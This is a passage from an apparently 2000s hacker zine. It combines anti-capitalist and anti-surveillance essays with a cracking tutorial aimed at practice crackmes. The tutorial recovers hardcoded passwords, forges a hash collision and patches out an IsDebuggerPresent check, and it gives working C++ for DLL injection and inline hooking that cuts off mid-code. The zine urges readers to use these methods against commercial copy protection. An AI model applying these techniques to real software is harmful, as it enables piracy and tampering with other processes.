going on. There are some scary things happening in the world and there are some
truly sad things. But we can never let fear consume us.

FEAR AS A FORM OF SOCIAL CONTROL

The greatest example of the forces that controll the world using fear to
strengthen there controll would be ""The war on *"". Any war only serves to spread
fear further throught the world whether it be a war on communisim, a war on
drugs, a war on terrorisim or the coming war on freedom. Dont support war no
matter what the cause! And dont support fear either, coming from any source.
Unfortunately sometimes even the best of us can get too run down from dealing
with everything from the bullshit of daily life to the sometimes unbarable
saddness of reality. The isolation of sitting in front of a computer screen for
hours every day can draw you into fear and paranoia as well as constantly
surronding your self with people. Like I said, it happens to all of us so here
are some tips to keep your sanity and keep active!

Dont isolate yourself
If you are starting to feel overwhelming depression, don't isolate yourself! Go
find a trusted friend and let them know how you are feeling. Interact with
someone, even if it is only for a couple hours. Your friends can help you ground
yourself and get into a healthier state of mind.

Ok so sometimes maybe you should isolate yourself
Sometimes there are too many people around in your everyday life and you need to
get away, this can easily happen in large shared living spaces as well as for
those who just work on a lot projects. Sometimes it is good to go out in the
woods and camp for a few days. Go remember why you are working for a better
world and what you are doing, who you are.

Love yourself and others
This is probably the most important point that I can make. As I said, the
greatest weapon of those in power is fear. The best way to fight fear is love.
Always remember to love yourself. And make love to yourself. And also, if you
love yourself, love others! If you love your self and others than you will have
a much easier time coming back from a nervous breakdown or depression because
you will always know that you have yourself and those that you love.

There are lots of amazing things happening right now and every day. The forces
of capitalisim are waning. They are falling and will continue to fall only as
long as we keep changing the world. We can't change the world if we are locked
in paranoia and fear so we must keep sane and stay in touch with the world and
in love.

** Eye on Big Brother **

* FBI Seeks to Expand Network Tapping Capabilities
The FBI is trying to expand the Communications Assistance for Law Enforcement
Act(CALEA) to have greater electronic surveillance capabilities. If passed, the
bill would force manufacturers of common networking devices(ethernet hubs,
telephone switches, wifi routers, etc) to develop modifications and upgrades
that integrate built-in backdoors that allow law enforcement or others to
monitor traffic.

* EFF battles Unconstitutional Warrant-less NSA Spying on All Americans
With the cooperation of major telecommunication corporations, the NSA has
launched a massive electronic surveillance system to monitor and analyze the
internet and telephone traffic of millions of Americans. While these
unconstitutional warrant-less searches are illegal, the NSA has been given the
green light by Bush personally, which demonstrates a frightening collaboration
by private corporations, law enforcement, and the executive branch. An AT&T
technician himself who had helped in building these 'secret rooms' for the NSA
is now working with the EFF in testifying against his former employer in a
lawsuit demanding that AT&T stop illegally disclosing it's customers'
communications to the government. The battle is still in the courts where the US
Government has filed a motion trying to dismiss the EFF's suit claiming that any
investigation into whether AT&T broke the law could ""reveal state secrets and
harm national security"".

################################################################################
#                           05. How the Net was Lost                           #
################################################################################

 ""When people ask me if I work in the public or private sector, I never know to
respond, as I simply work in solidarity in the human sector""

 Those who currently struggle to maintain what is called ""Net Neutrality"" on the
internet I think have taken too limited an approach to their struggle. What they
ask is to maintain an existing status quo that had already been eroded from the
original promise and potential of the internet against those who wish to change
it even further. This to me leaves for a poor negotiating position when congress
loves to bridge difference with half measures, and even limited compromise
between the current status quo and proposed changes would still be disastrous.
This would be much like North American civil libertarian's discussing which of
the remaining of the first 10 amendments they will be forced to accept being
discarded versus those they think they can still actually preserve. This to me
is a long term losing position to occupy.

 In the beginning, the internet was a peering arrangement where all nodes were
treated equally, and anyone could interconnect from any one node to another.
This was the network of peering built upon public standards that anyone could
freely implement. Other commercial networks also existed, some built on the
layered OSI model. All, however, were implemented in some proprietary fashion,
or otherwise built around some controlling model of centralized traffic routing,
rather than that of essentially equal peers, and as a result diminished over
time.

 The internet eventually spread to the general population through modem dialup.
This changed the internet from being a semi-closed environment connecting just a
few hundred or thousand commercial and government institutions into something
interconnecting millions. The speeds and bandwidth of analog modem dialup
naturally limited what individuals could do over dialup links, but outside of
technological limitations, the internet imposed no additional discriminatory
practices nor did those ISPs who offered direct internet access through dialup
at the time. While closed garden proprietary dialup service providers like Game
Master, CompuServe, and America Online, came and went, people remained free to
use direct dialup networks for both consuming and producing content on a peer
basis. There was a time in fact that I ran my own domain and mail servers out of
my own location on a dialup connection.

 With the widespread introduction of broadband, over cable and DSL, came the
first real discrimination on the internet. Just when finally there was enough
easily deliverable bandwidth to go around to enable the millions of dialup users
to more directly participate on the internet, it was closed off from them. At
the physical layer, peering was closed by artificial uplink ""bandwidth caps"",
which restricted their ability to produce and distribute. At the application
layer, broadband providers actively discriminate by blocking certain ports and
services, particularly in regard to email. At the legal layer, broadband service
agreements offered through monopoly telco and cable companies restrict what
services and applications people can run.

 Even during the age of dialup, when bandwidth was scarce except for a few
locations, a model for service hosting and co-location appeared. This allowed
someone who had a peering agreement, which already was very expensive, to then
distribute and share the cost of bandwidth by renting space and/or servers on a
rack to others. With the introduction of capped, application layer and legally
restricted broadband, hosting became the last refuge for what the original
internet was about; peering by equals.

 This division between consumers and producers means only a limited few are
privileged to directly publish on the internet. YetÑeven though they pay
considerably more for that privilege and their connectivity already, and even
though consumers pay directly for their connectivity as wellÑthe current
internet backbone peer providers wish to collect additional charges, and
otherwise artificially constrain traffic to hosting facilities and companies as
they please, much like they do with those they consider consumers. The death of
internet peering means that hosts will be billed based on their popularity as
well as the bandwidth they consume and have paid for. It also reduces all
hosting arrangements into a question of pure economic value, rather than
considering the social value of sites that exist for non-commercial purposes or
that otherwise do not charge. Finally, the death of Net Neutrality means
providers could selectively choose to make some sites (commercial competitors,
those who publish information that they disagree with, etc) entirely unreachable
if they so choose.

 The internet flourished and grew precisely because nobody was in control of
traffic. That millions now are classified as passive consumers already is an
affront to the dream of an active community where everyone has opportunity to
participate and publish. The remaining struggle over Net Neutrality today is
simply one of how small and how privileged a minority will still retain the
ability to publish, and hence how much it will cost to still exercise former
rights as reclassified as a limited privilege at the discriminatory whim of a
few large corporations.

 The internet today is already divided between a large number who are only
allowed to consume and a small number who are permitted to produce. Rather than
simply fight to preserve this already unequal status quo, it would be far better
to challenge it by fighting to actively restore the rights of all internet
users. In the worst case of such an effort, the current status quo then becomes
the logical compromise position, rather than the starting point in any forced
negotiation. Today, those fighting for Net Neutrality are already backed to the
edge of a cliff. The telecoms want them to step a further ten feet over the
edge, but they (the telecoms)are probably quite willing to accept a compromise
where those defending Net Neutrality are asked to step only 5 feet off instead.
It would be far better to push forward rather than to simply try to stand still.
 
################################################################################
#                        06. Consumer Society Revisited                        #
################################################################################

 When I look around at this world, I see several things, I see beauty, joy and
hapiness, but I see something else which is getting more and more common, it's
depression, agression, egoism, sky-rocketing suicide counts and general increase
in dissatisfaction and psychological disorders. 

 The most common and prevailing among modern-day psychological disorders is
depression.
 Numerous recent epidemiological studies indicate that depressive disorders in
children and adolescents are quite common and growing. Roughly 15% of
adolescents admit to having suffered from such a disorder at some time or other.
The cause of these depressions often lies in dysfunctional families, negative
life events (which seem to increase in occurance according to the research) and
an extreme ammount of pressure, both from peers and adult expectance resulting
in streess, which upon occurance of failure and negative reactions from the
expecting side results in low self-esteem and self-defeating/distorted thinking,
leading to even more depression. Take Japan for example, over 30,000 people last
year took their lives, of which many where adolescents who couldn't cope with
the high standards of education, necesarry for corporate employment.

 But not only adolescents cope with depression, lots of adults have to deal with
it as well. Depression in adults is most often caused by lost fights for
dominance inside a social group. This ""fight"" is, in modern times, climbing the
corporate ladder. A lot of talented people go to work every day, only to sit in
their cubicles, commute their asses of, for a low wage, while their bosses,
bulky CEOs make an absurd ammount of money, enough to keep hundreds of people in
a third world country alive, while only commanding their workers. Often these
CEOs don't even care what actually goes on in their company, let alone being
capable of understanding. The researchers who work hard on new technology get
virtually no respect and a small wage, this goes for the general commuters as
well. They MAKE the company, yet the ""big boss"" gets away with all the money and
virtually no input in the product. Climbing the corporate ladder means kicking
down and kissing up. If you're not prepared to do that (because of moral
objections), you will be neglected and will remain in a low corporate position.
The stress and failures that come with this enforced process are the most common
cause of depression. 

 This society is a consumerism society that has gone way too far. From the
beginning of the industrial revolution in the late 18th and early 19th century
till now we have used more of the earths resources then in the previous
4,499,999,794 years. This resource consumption has reached a level of absurd
proportions, almost of the level in which society can't supply itself anymore.
Within the next 60 years the worlds oil resources will be completely exhausted,
leaving an empty and collapsed society, in which only those at the top can
survive, the globalist extortionists. These corporations, growing bigger and
bigger, until they reach proportions at a level that they can control
governements, police forces and ,worst of all, global media. Orwell's vision of
the future, in which people are brainwashed into believing everything the
governement controlled media tells them isn't fiction or future, it's reality.
The global media isn't independant, nor is governement information. Both are
(indirectly) controlled by large corporations which keep the ""country's economy
running"" and finance or media stations. Public opinion is controlled in subtle
ways, by advertising, not broadcasting news that could negatively influence the
public and depecting dissidents are ""rebels, insurgents, counter-culture loons,
hippies or radicals"", all because those people oppose a society in which the
masses produce for the elite, which hold virtually all power. 
 Take the ""Compass Group"" for example, a multinational food catering
organization. The Compass Group is involved in a corruption scandal with its
subsidiary Eurest Support Services winning contracts to provide food to United
Nations peacekeepers in Liberia. The value of Compass's food contracts with the
United Nations is valued at $237 million, with renewals and add-ons that could
reach $351 million.
 The UN Procurement Officer and Vladimir Kuznetsov Head of the UN Committee for
Administrative and Budgetary Issues were arrested and indicted after taking
nearly $1 million in bribes from Compass, allowing them to extend their
globalist corporate empire.
 Compass refused to make details public and the investigation only resulted in
some low-level employees being fired and the CEO Michael Bailey stepping down in
June 2006 with a fat bonus and a Golden Handshake enough to supply a third world
country for years. 
 As seen, the influence of corporations is so huge that it even extends to
supposedly unbiased, non-profit peacekeeping organisations as the UN, without
having to fear reprisal.

 When confronting society with these facts, most high-ranking corporate
officials will defend themselves with the argument of ""Well, then don't
participate in the process!"". This is of course a bullshit argument. In this
society we are nothing more but consumers, consumers of the goods we produce
ourselves, buying it for more money than we made it for, the difference sliding
in the pockets of the ruling class. This society has developped a fetish for
goods and services, how useless they even may be. The products have no values of
themselves, it's a social signal to indentify yourself to the rest of society as
a fellow consumer, gaining ungrounded peer-respect stimulated by the media, who
depicts consumption as the ultimate virtue. The god of this world is the coin,
and it's priests are the corporate leaders, spreading their almost zealous
relegion in every subtle way they can, enslaving the public to their useless
products, making them wage-slaves to the corporations, without a free will. I
ask you, what are we when we don't consume? Nothing, we are meant to buy, media
brings it to our attention, tooth-brushes with GPS systems, earplugs with
airconditioning, cars with weather-forcasting, bikes with suncover caps, chairs
with built-in remote controls and beertenders, and so on. 
 This over-consumption society will eventually break down our very ability to
judge products or services by their values, eventually leading to a society in
which free-thinking is discouraged, descisions are made by a select few and
emotional instability will be extremely common. If society continues in this
trend, global resources will be exhausted in the next 60 years, leaving a
devasted society with tons of environmental problems behind, in which only a
select elite, based on their undeserved financial capacities can survive, for
the masses to starve. 
 Such a future should be prevented and the current consumerist society must to
every extend and cost be abolished, lest it will be to late to stop this world
from consuming it's way into oblivion.

 Cast your mind back to when you were a child, everything was full of hope and
curiosity, a world of adventure and challenge, what is left of it? A life to be
wasted in a cubicle for some CEO's sake. Your mind being poisoned by the media: 

 Politics: ""Act as you are told by our 'laws' or we'll take 'measures'""

 Economics: ""Work hard and consume, this will contribute to our beautiful
society and maybe one day you'll be rich!""

 Religion: ""Don't sin against the 'rules of god' or you'll be damned forever
after your death""

 Since the birth of consciousness, hundreds of millions of human beings have
been slaughtered by their fellows.Men, women, children ... snuffed out as if
their lives meant nothing.
 Why? Because we look to leaders and priests and gurus and ""stars"" to tell us
what to do instead of relying on the powers of our own sovereign minds. Some
will see this as a ""left-wing radical counter-culture hippie rant"", after all,
they live in a ""democracy"" no? So tell me, what happens if you want to disobey
them? Say you have moral objections against the current governement. You object
to paying taxes to support the President, his family, his bodyguards and the
friends he wangled jobs for. What do you do? Or say you don't like your taxes
being used to subsidize foreign arms sales for slaughter in the third world. How
can you stop it? Vote for somebody else, whose policy makes virtually no
difference? Don't vote and loose your voice? The government pretends to be there
to serve you. In reality, it's there to tell you what to do. If you refuse to
obey, you'll be investigated, arrested, criminalized and made an example.Your
assets will be seized and given to the state. You will be jailed and demonized.
This world will soon reach a totalitarian consumerist society dominated by
administration bigwigs who view the world from stretch limos, while hunders of
thousands of families sleep in cardboard boxes and can barely eat. Corrupt
businessmen flourish, while honest men beg in the gutter, crime will explode,
and everybody will be forced to believe it HAS to be that way, it's the best for
the collective good. Imagine you're a child again. Filled with innocence, and
wonder, and life. Remember how good it felt?That's what the parasites stole from
us. They bled us dry. And like sheep we lined up to give more blood. But we can
have back all that they stole.The information age provides a spotlight the
parasites can't squirm away from. They can't take us on on the net, identify
them. Negate their evil. Ostracize them. Show them you are not a slave!

                     -####################################-
                     -####           SKILLS            ###-
                     -####################################-

################################################################################
#                      Disrespect Copyrights in Practice                       #
################################################################################
(code and other files associated with nomenumbra's article are located at
http://www.hackbloc.org/zine/vivalarevolution.rar - pass is 'anarchism')

Disclaimer:
Some official shit that's needed:
This document is to be used for legal and educational purposes only. The author,
nor anyone publishing this article can and/or will/might/shall not be held
responsible in any way for any damage (potentially) done by anything described
in this article. If this informotion makes you want to rape, murder, lie, cheat,
pillage, extort, be hyporitical and capatalisitic I strongly advise you to cut
your veins and die ...

Foreword:
In this globalist world there are only two values left, how much one can consume
for the hightest possible price and how much one can produce for the least
possible pay, all to serve the great green god, commonly referred to as 'the
dollar', and it's imperialistic hegemonistic pions, commonly referred to as
'CEOs'. Their ways of extortion of third world countries and the social
'lowerclass' and abduction of free speech and thought in the first world have
taken gross forms in today's society.. And like this isn't enough, they have
been joined by whitehats to help 'secure' their software from people who break
their unrighteous copyrights. This article will give the reader a standard
overview of techniques used to protect applications and ways to bypass them..
The target applications (called ""Acts"" (Act I,Act II,etc)) come with this zine
(if everything goes ok :p )
Have phun!

Introduction:
Well people, reversing applications can range in difficulity level from
extremely easy to mindcrushing. Since this article is an introduction, I won't
discuss extremely advanced schemes but I will show you some nice reversing
tricks. Required knowledge to understand this article:
  -)Basic understanding of 32-bit windows ASM
  -)Basic understanding of the usage of Debuggers/Disassemblers
  -)A brain

You can either try to crack each app first and read my tutorial afterwards or
just follow along, you choice. Each Act is given an ""objective"" so you know what
to look for and what you can learn there (all passwords are normal words,eg. no
Ae534RKLjl passwords but SOMEPASSWORD).

Act I:
Difficulity: [....]
Tools: OllyDbg
Objective: Find the password

Ok, imagine you just downloaded a nice game (""LameGame V 1.0"") and you're ready
to enjoy playing it. You launch the bitch and THIS jumps up:

LameGame V1.0
(c) MegaCorp 2006-2099

Usage:
 cp1 <password>

Ok, THAT sucks ass, now we'll have to supply a password as a command-line
argument... Well, it shouldn't be THAT difficult to crack...

Let's fire up OllyDbg and load our app ....
One of the first things I always do when reversing an app is checking what
strings are inside the body. Now, if we scroll down a bit we'll see the text
""LameGame V1.0"" displayed. Now we take a look at the assembler in that area we
see a call to <JMP.&msvcrt.strcmp> where the result of a call to 0042A040 (this
result is argv[1]) gets compared to the ""BULKMONEY"". That was foolish, leaving
the password in plaintext in the executable....

Act II:
Difficulity: My granny could do this
Tools: OllyDbg
Objective: Find the password

MegaCorp recently released a new version of ""LameGame"" since V1.0 was could be
cracked by any no-brains monkey. The new version claims to be more secure than
the first, but is this true? We fire up OllyDbg again and we see that the string

""HMPCBMJTU"" gets copied to the address 00443010.
Now we search for the ""LameGame V1.1"" string. This time argv[1] gets compared to
00443010, so argv[1] is compared to ""HMPCBMJTU"" or is it? Take a closer look and
you'll see that the result of strlen(""HMPCBMJTU"") gets stored at EAX, and
compared to DWORD PTR SS:[EBP-4] (which is obviously a counter), if it isn't
below (so we've reached the end of the string ""HMPCBMJTU"") we leave this
subroutine. Now notice the following:

DWORD PTR SS:[EBP-4] gets stored at EAX, then the offset of ""HMPCBMJTU"" is added
(we now have the address of the current character in EAX), the next interesting
thing is the decrease of that character's value (MOVZX EAX,BYTE PTR DS:[EAX]
then DEC AL). Then we load the counter in EAX and increase it and continue the
loop. So what happens is that every character gets decreased with 1, so the
password should be ""GLOBALIST"".... Pathetic company, they really don't know
their shit, now do they?.....

Act III:
Difficulity: Easy as pie....
Tools: OllyDbg
Objective: Find the password

Well, MegaCorp anounced they recently hired a new programmer to ensure the
cracking of their game would be made impossible by implementing a far more
sophisticated encryption algorithm [that'd be time....]. Well, we fire up Olly
again and see not much has changed, the subroutine structures have remained the
same. But when we take a closer look we can see the cryptoscheme HAS been
improved (still pathetic and breakable within 13 seconds but hey....) 
Well, we don't want to go trough all the hassle of thinking :D so we'll just let
the debugger do the job... 
See the POP EBP at 004013F8? well, we'll put a breakpoint there to freeze
execution once we get there (so we can see how the cryptostring is
decrypted).Now press F9 and GO! Watch the dump an Voila, we got it 

004013CF  |. 81C1 10304400  |ADD ECX,Cp1.00443010                    ;  ASCII
""EXTORTION""

Act IV:
Difficulity: Medium
Tools: OllyDbg
Objective: Find the password or find hash-collision

Instead of reducing the absurdly high price of ""LameGame"" MegaCorp gave up it's
production because all they care about is profit and not their customers. But
they just brought out a new product, a new firewall named ""Infernal Barricade"".
In order to install ""Infernal Barricade"" we need to bypass their newest
copyright scheme. Let's take them on with OllyDbg once again...
Hmm... no strcmp anymore? That means they have though of something else than
using a password. Let's take a closer look.
It seems that the program makes the final desicion as to whether your key was
correct or not here:

00401491  |> 807D FF 00     CMP BYTE PTR SS:[EBP-1],0
00401495  |. 74 26          JE SHORT Cp1.004014BD
00401497  |. C74424 04 3400>MOV DWORD PTR SS:[ESP+4],Cp1.00440034    ;  ASCII
""Installing 'Infernal Barricade'...""

And these call/cmp constructions are probably used to analyze your key too:

0040146B  |. E8 308C0200    CALL Cp1.0042A0A0
00401470  |. 837D 08 01     CMP DWORD PTR SS:[EBP+8],1
00401474  |. 7E 1B          JLE SHORT Cp1.00401491
00401476  |. 8B45 0C        MOV EAX,DWORD PTR SS:[EBP+C]
00401479  |. 83C0 04        ADD EAX,4
0040147C  |. 8B00           MOV EAX,DWORD PTR DS:[EAX]
0040147E  |. 890424         MOV DWORD PTR SS:[ESP],EAX
00401481  |. E8 0AFFFFFF    CALL Cp1.00401390
00401486  |. 3D 10030000    CMP EAX,310
0040148B  |. 75 04          JNZ SHORT Cp1.00401491
0040148D  |. C645 FF 01     MOV BYTE PTR SS:[EBP-1],1

after analyzing each call it turns out this one:
00401481  |. E8 0AFFFFFF    CALL Cp1.00401390
is the most interesting (looks like the decryption-constructions we've seen
before). The function returns a value in EAX that gets compared to the static
value 0x310. If we examine the function we can see the argument passed (argv[1]
in this case) is manipulated into a hash value, let's test this thesis.
To fake a command-line go to Debug->Arguments and supply your argument. 

Ok, time to put a breakpoint before the end of the subroutine (located at
004013F9) and F9! Now take a look at the EAX register's value (seen in the right
part of the screen), I used ""FUCKYOU"" as an argument, resolving to 0x21C ....
That means we must supply a commandline argument that will be resolved to 0x310.
We could do this in two ways, by looking for a collision in the algorithm or by
bruteforce. Let's rip the algorithm first. 
Ok, to make things clear:

DWORD PTR SS:[EBP-8] is the counter (i)
DWORD PTR SS:[EBP+8] is the beginning of argv[1]
DWORD PTR SS:[EBP-C] is input[i] (DWORD PTR SS:[EBP-8]+DWORD PTR SS:[EBP-8])

004013A4  |> 8B45 08        /MOV EAX,DWORD PTR SS:[EBP+8]            ; |
004013A7  |. 890424         |MOV DWORD PTR SS:[ESP],EAX              ; |
004013AA  |. E8 C1F30000    |CALL <JMP.&msvcrt.strlen>               ; \strlen
004013AF  |. 3945 F8        |CMP DWORD PTR SS:[EBP-8],EAX
004013B2  |. 73 45          |JNB SHORT Cp1.004013F9
004013B4  |. 8B45 08        |MOV EAX,DWORD PTR SS:[EBP+8]
004013B7  |. 0345 F8        |ADD EAX,DWORD PTR SS:[EBP-8]
004013BA  |. 0FBE00         |MOVSX EAX,BYTE PTR DS:[EAX]
004013BD  |. 8945 F4        |MOV DWORD PTR SS:[EBP-C],EAX
004013C0  |. C745 F0 000000>|MOV DWORD PTR SS:[EBP-10],0
004013C7  |. 8B45 08        |MOV EAX,DWORD PTR SS:[EBP+8]
004013CA  |. 0345 F8        |ADD EAX,DWORD PTR SS:[EBP-8]
004013CD  |. 8038 00        |CMP BYTE PTR DS:[EAX],0
004013D0  |. 74 0D          |JE SHORT Cp1.004013DF
004013D2  |. 837D F8 00     |CMP DWORD PTR SS:[EBP-8],0 ;if i is 0 result is 0
004013D6  |. 74 07          |JE SHORT Cp1.004013DF
004013D8  |. C745 F0 010000>|MOV DWORD PTR SS:[EBP-10],1
004013DF  |> 8B45 F0        |MOV EAX,DWORD PTR SS:[EBP-10];-> (input[i] && i)
004013E2  |. 3345 F8        |XOR EAX,DWORD PTR SS:[EBP-8];-> EAX XoR i
004013E5  |. 0345 F8        |ADD EAX,DWORD PTR SS:[EBP-8];-> (EAX XoR i) + i
004013E8  |. 8B55 F4        |MOV EDX,DWORD PTR SS:[EBP-C] 
004013EB  |. 31C2           |XOR EDX,EAX        ;-> ((EAX XoR i)+i) ^ input[i])
004013ED  |. 8D45 FC        |LEA EAX,DWORD PTR SS:[EBP-4]
004013F0  |. 0110           |ADD DWORD PTR DS:[EAX],EDX
004013F2  |. 8D45 F8        |LEA EAX,DWORD PTR SS:[EBP-8]
004013F5  |. FF00           |INC DWORD PTR DS:[EAX]
004013F7  |.^EB AB          \JMP SHORT Cp1.004013A4


""Hash"" algorithm:

(input[i] XoR (((input[i] && i) XoR i) + i))

Well, writing a bruteforcer for this is peanuts but there must be an easier
way....through algorithmic collision. Let's see, the input ""TEST"" generates 319
as a value, now let's try ""UEST"" ... 320, how predictable and let's try ""TFST""
-> 322. Now we're getting somewhere :D. 
Ok, let's try filling up the bitch with A's.
""AAAAAAAAAA"" resolves to 721 while 1 A more gives us 805, so we need to sit
somewhere in between.
""AAAAAAAAAZ"" resolves to 716 ,""AAAAAAAABZ"" to 719 and ""AAAAAAAACZ"" to 718, let
me predict, ""AAAAAAAAEZ"" wil resolve to 720.... <.<
Ok, we need 784... after some trying we find out ""AAAAAAA{{Z"" resolves to 784..
Let's try >:).. YES! It works... Our collisive hash managed to  trick the
program into installing, without having having to know the 'real' password
(which was MILITARISM btw)....

Act V:
Difficulity: Medium
Tools: OllyDbg, Hexeditor
Objective: Find the password, defeat anti-debugging

MegaCorp got fed up with being cracked over and over so they consulted some
whitehat corporate lapdog to strengthen their apps and sell our scene out at the
same time... Rumor has it he implemented an anti-debugging trick in the newest
version of ""Infernal Barricade"". Let's fire up OllyDbg YET AGAIN! Ok, lets see
what they have been trying to do this time... 

0040144F  |. C600 00        MOV BYTE PTR DS:[EAX],0                  ; ||
00401452  |. E8 E9F50000    CALL <JMP.&KERNEL32.IsDebuggerPresent>   ;
||[IsDebuggerPresent
00401457  |. 85C0           TEST EAX,EAX                             ; ||
00401459  |. 74 18          JE SHORT Cp1.00401473                    ; ||
0040145B  |. C70424 0C00440>MOV DWORD PTR SS:[ESP],Cp1.0044000C      ; ||ASCII
""Your attempt to debug this application is considered a crime by the U.S
governement, legal action will be taken against you...
""
00401462  |. E8 69F30000    CALL <JMP.&msvcrt.printf>                ; |\printf
00401467  |. C70424 FFFFFFF>MOV DWORD PTR SS:[ESP],-1                ; |
0040146E  |. E8 4DF30000    CALL <JMP.&msvcrt.exit>                  ; \exit

LOL! They use a standard win32 API called IsDebuggerPresent to check if the
application is being debugged.... hmmm,

004013C4  |. C74424 04 0000>MOV DWORD PTR SS:[ESP+4],Cp1.00440000    ; |ASCII
""LOIACU]QH""

seems to be the encrypted password, we don't want to spend a lot of time to rip
the algorithm and decrypt it by hand so let's debug it! As expected the
application terminates when we debug it this way. Let's take a closer look at
the anti-debug technique:

00401452  |. E8 E9F50000    CALL <JMP.&KERNEL32.IsDebuggerPresent>   ;
||[IsDebuggerPresent
00401457  |. 85C0           TEST EAX,EAX                             ; ||
00401459  |. 74 18          JE SHORT Cp1.00401473                    ; ||

This piece is interesting, it calls IsDebuggerPresent and sees if true is
returned in EAX, if so, it ends, if not it continues... hmm interesting
conditional jump, what if we'd make it an uncomditional jump, always jumping to
continue the application (JMP is 0xEB, keep that in mind).....
Fire up a hexeditor (or just do it in OllyDBG, i just want to let you play with
HexEditors as well :D ) and open the app in it. Now look for the following
sequence of bytes:
00401457  |. 85C0           TEST EAX,EAX                             ; ||
00401459     74 18          JE SHORT Cp1.00401473                    ; ||

find: 85C07418

and replace the 74 with EB...
That was easy, we already broke their anti-debugging technique (fuckers).
Now all we gotta do is put a breakpoint on 
00401470   . C600 00        MOV BYTE PTR DS:[EAX],0
so we can watch ECX being ""IGNORANCE""... yet another application broken, hehe

There are many commercial copyright-protection schemes which would make life
difficult if we'd reverse only in the ways described, but there are other ways
too, by taking advantage over the fact that the target program runs in YOUR
environment, you control the OS! That means you can manipulate it from all
sides. One way is process hijacking by DLL injection, which i'll describe here:

Process Hijacking

Process hijacking involves executing you code in another process' context (not
as in exploiting it to make it execute shellcode). This can be achieved in two
ways, either directly by executing a part of you executables code in the remote
process, or by DLL injection. With the advent of Windows DEP (Data Execution
Prevention) this leaves us the latter. Injecting your DLL into another process
goes as follows:

       Fetch the target process' PID (Process ID)
       Open a handle to the target process
       Fetch the address of LoadLibraryA dynamically
Allocate enough memory for an argument to LoadLibraryA
Do a VirtualProtectEx to set the code pages to PAGE_EXECUTE_READWRITE
      write the name of the DLL to load ,into the memory (we obviously can't use
a local address)
       restore the old permissions

Here follows a sourcecode example in c++:

BOOL WriteToMemroy(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer,
SIZE_T nSize)
{
	DWORD dwOldProtect; 
	BOOL boolReturn = FALSE; 
	if(hProcess == NULL) // own process?
	{ 
		VirtualProtect(lpBaseAddress, nSize, PAGE_EXECUTE_READWRITE,
&dwOldProtect); // now Ex needed, only a VirtualProtect
		boolReturn = ((memcpy(lpBaseAddress, lpBuffer, nSize))? 1 : 0); //memcpy
instead of WriteProcessMemory
		VirtualProtect(lpBaseAddress, nSize, dwOldProtect, &dwOldProtect); //
set back
	} 
	else 
	{ 
		VirtualProtectEx(hProcess, lpBaseAddress, nSize, PAGE_EXECUTE_READWRITE,
&dwOldProtect); // Virtualprotectex to be able to read and write code
		boolReturn = WriteProcessMemory(hProcess, lpBaseAddress,
(LPVOID)lpBuffer, nSize, 0); // Write to memory
		VirtualProtectEx(hProcess, lpBaseAddress, nSize, dwOldProtect,
&dwOldProtect); //set back
	} 

	VirtualFreeEx(hProcess, lpBaseAddress, nSize, MEM_RELEASE); // free memory
	return boolReturn;
}  


BOOL InjectDLL(char* ProcessName, char* strHookDLL)
{
    printf(""Initiating injection of '%s' into '%s'\n"",strHookDLL,ProcessName); 
    DWORD dwPID = GetProcessID(ProcessName);	
	if(dwPID == 0)
	{
            printf(""Couldn't retreive valid ProcessID for process
'%s'!\n"",ProcessName);
		    return FALSE;
	}
	HANDLE hProcess;								
	HMODULE hKernel;								
	LPVOID RemoteStr, LoadLibraryAddr;
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID); // open the
process	if(hProcess == INVALID_HANDLE_VALUE) //couldn't open?
	{
		printf(""Couldn't open process '%s' with ID %d!\n"",ProcessName,dwPID);
		return FALSE;
	}

	hKernel = LoadLibrary(""kernel32.dll"");	//load kernel32.dll

	if(hKernel == NULL)// couldn't load?
	{
        printf(""Couldn't load Kernel32.dll!\n"");
		CloseHandle(hProcess);
		return FALSE;
	}

	LoadLibraryAddr = (LPVOID)GetProcAddress(hKernel, ""LoadLibraryA"");// fetch
address of LoadLibraryA
	RemoteStr = (LPVOID)VirtualAllocEx(hProcess, NULL, strlen(strHookDLL),
MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE); // allocate memory size of argument
	if(WriteProcessBytes(hProcess, (LPVOID)RemoteStr, strHookDLL,
strlen(strHookDLL)) == FALSE) // write it to memory
	{
		printf(""Couldn't write to process '%s' memory!\n"",ProcessName);//
failed?
		CloseHandle(hProcess);

		return FALSE;
	}          
	HANDLE hRemoteThread = CreateRemoteThread(hProcess, NULL, 0,
(LPTHREAD_START_ROUTINE)LoadLibraryAddr, (LPVOID)RemoteStr, 0, NULL);// remotely
load our DLL
	if(hRemoteThread == INVALID_HANDLE_VALUE)// failure?
	{
        printf(""Couldn't create remote thread within process
'%s'!\n"",ProcessName);
		CloseHandle(hRemoteThread);
		CloseHandle(hProcess);
		return FALSE;
	}
	CloseHandle(hProcess);
	printf(""'%s' successfully injected into process '%s' with ID
%d!\n"",strHookDLL,ProcessName,dwPID);
	return TRUE;
} 

Well that wasn't THAT difficult, now was it? The next question that arises is
""What to inject?"". Well you can do a lot once your DLL is loaded, ranging from
process termination to full-blown  input/output manipulation. The template of
your DLL should look like this:

BOOL APIENTRY DllMain( HANDLE hModule, 
                       DWORD  ul_reason_for_call, 
                       LPVOID lpReserved
					 )
{
  switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	{
		DisableThreadLibraryCalls((HMODULE)hModule); //don't get re-called
		// do what you want once attached	
		return true;
	}break;	
	case DLL_PROCESS_DETACH:
	{
		// bring back to old state
	}break;
  }
  return true;
}

Imagine the following application:

int main(int argc, char *argv[])
{
    system(""PAUSE"");
    if (argc-1)
    {
    if (strcmp(argv[1],""XPLT"") == 0)        
      MessageBoxA(0,""Accepted"",""Accepted"",0);
               
    }    
    return 0;
}

Ok, this simple app can be fooled by hijacking the main function it relies on,
strcmp. Strcmp is a string comparing function located in the Dll ntdll.dll. The
pause is used to ensure we get the time to inject our DLL into the victim app. 
Ok, we'll hijack the function by using a detours trampoline. Detours patching,
as described in: 
http://research.microsoft.com/~galenh/Publications/HuntUsenixNt99.pdf 
goes as follows:

Here follows a small example in C++:

DWORD InlineHook(const char *Library, const char *FuncName, void *Function,
unsigned char *backup)
{
	DWORD addr = (DWORD)GetProcAddress(GetModuleHandle(Library), FuncName); 
// Fetch function's address
	BYTE jmp[6] = {
                           0xe9,			  //jmp
		0x00, 0x00, 0x00, 0x00,  //address
		0xc3                                // retn
                                     };
          ReadProcessMemory(GetCurrentProcess(), (void*)addr, backup, 6, 0); 
// Read 6 bytes from address of hooked function from rooted process into backup

